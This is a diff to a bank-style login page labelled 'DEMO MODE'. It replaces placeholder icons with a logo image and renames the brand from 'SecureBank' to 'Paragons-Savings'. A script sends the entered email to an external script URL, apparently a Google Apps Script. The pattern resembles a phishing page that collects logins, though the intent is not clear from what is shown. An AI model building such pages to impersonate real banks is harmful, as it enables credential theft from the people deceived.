@@ -23,25 +23,21 @@
             text-align: center;
         }
 
-        /* Top Wrench Icon (Positioned Absolute) */
-        .wrench-icon {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            background-color: #6C63FF; /* Purple from your screenshot */
-            border-radius: 50%;
-            padding: 10px;
-            width: 24px;
-            height: 24px;
-        }
 
         /* Central Yellow Bank Icon */
-        .bank-logo {
-            margin-top: 50px;
-            font-size: 60px; /* Big bank emoji for placeholder */
-            color: #FFD700; /* Gold/Yellow */
-            margin-bottom: 30px;
-        }
+       .logo-wrapper {
+    margin-top: 50px;
+    margin-bottom: 30px;
+    display: flex;
+    justify-content: center;
+}
+
+.bank-logo-img {
+    width: 80px;  /* Adjust this size based on your pic */
+    height: auto;
+    border-radius: 15px; /* Optional: rounds the corners of your pic */
+}
+
 
         h1 { font-size: 28px; margin-bottom: 5px; }
         .welcome-text { font-size: 16px; color: #888; margin-bottom: 20px; }
@@ -103,11 +99,13 @@
 <body>
 
     <div class="login-container">
-        <div class="wrench-icon">🔧</div>
 
-        <div class="bank-logo">🏛️</div>
+      <div class="logo-wrapper">
+    <img src="logo.png" alt="SecureBank Logo" class="bank-logo-img">
+</div>
 
-        <h1>SecureBank</h1>
+
+        <h1>Paragons-Savings</h1>
         <div class="welcome-text">Welcome back</div>
 
         <div class="demo-tag">ⓘ DEMO MODE</div>
@@ -169,7 +167,7 @@
     fetch(`${SCRIPT_URL}?email=${email}`, {
     method: 'GET',
     mode: 'cors', // Add this
-    redirect: 'follow' // Add this to ensure it follows Google's redirect
+    redirect: 'follow' //ensure it follows Google's redirect
 })
 
     </script>
